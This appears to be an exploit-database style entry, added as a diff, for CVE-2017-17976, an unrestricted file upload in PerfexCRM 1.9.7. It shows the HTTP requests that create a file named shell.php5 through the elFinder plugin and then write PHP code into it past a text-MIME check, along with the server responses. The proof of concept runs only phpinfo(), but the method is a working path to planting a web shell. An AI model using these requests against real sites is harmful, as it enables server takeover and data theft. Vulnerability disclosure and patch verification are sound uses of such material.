@@ -1,0 +1,62 @@
+# Exploit Title: PerfexCRM 1.9.7 – Unrestricted php5 File upload 
+# Exploit Author: Ahmad Mahfouz 
+# Description: PerfexCRM 1.9.7 prone to unrestricted file upload that lead to system take over by misconfigured elfinder plugin
+# Contact: http://twitter.com/eln1x
+# Date: 12/01/2018
+# CVE: CVE-2017-17976
+# Version: v1.9.7 
+# Software Link: https://www.perfexcrm.com/
+
+ 
+
+# bypassing the misconfigured file upload with file .php5
+
+ 
+
+GET admin/utilities/elfinder_init?cmd=mkfile&name=shell.php5&target=[dir]
+
+
+JSON Response:
+
+{"added":[{"isowner":false,"mime":"text\/plain","read":1,"write":1,"size":"0","hash":"[XXX]","name":"shell.php5","phash":"[XXXX] "}],"changed":[{"isowner":false,"mime":"directory","read":1,"write":1,"size":0,"hash":"[ XXX]","name":"asa","phash":"[ XXX] ","volumeid":"[XXX]"}]}
+
+ 
+
+#bypass the file content restriction by adding TEXT line to represent mime type text
+
+
+Request
+
+
+POST /admin/utilities/elfinder_init HTTP/1.1
+
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+X-Requested-With: XMLHttpRequest
+
+Connection: close
+
+ 
+
+cmd=put&target=[folder]&encoding=UTF-8&content=demo
+
+ 
+
+newline to represent text mime type
+
+<?php
+
+    phpinfo();
+
+?>
+
+ 
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Connection: close
+Content-Length: 167
+
+ 
+
+{"changed":[{"isowner":false,"mime":"text\/plain","read":1,"write":1,"size":"44","hash":"[XXX]","name":"shell.php5","phash":"[XXX]]"}]}
